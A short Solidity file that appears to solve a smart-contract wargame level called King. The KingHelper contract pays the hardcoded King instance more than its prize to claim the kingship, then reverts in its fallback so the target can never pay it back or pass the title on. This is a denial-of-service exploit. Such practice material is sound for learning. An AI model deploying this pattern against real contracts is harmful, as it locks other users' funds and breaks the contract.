    // SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {King} from "../src/Level10King.sol";

contract KingHelper {
    address payable _king = payable( /*instance address*/ 0x1009c457113feA78076241131b94ddD5D88fB7eF);
    King king = King(_king);

    function getKingship() external payable {
        require(msg.value > king.prize(), "Need to send more Ether to become king");
        (bool success,) = _king.call{value: msg.value}("");
        require(success, "Failed to send Ether to King contract");
    }

    fallback() external payable {
        revert("I refuse to accept Ether");
    }
}
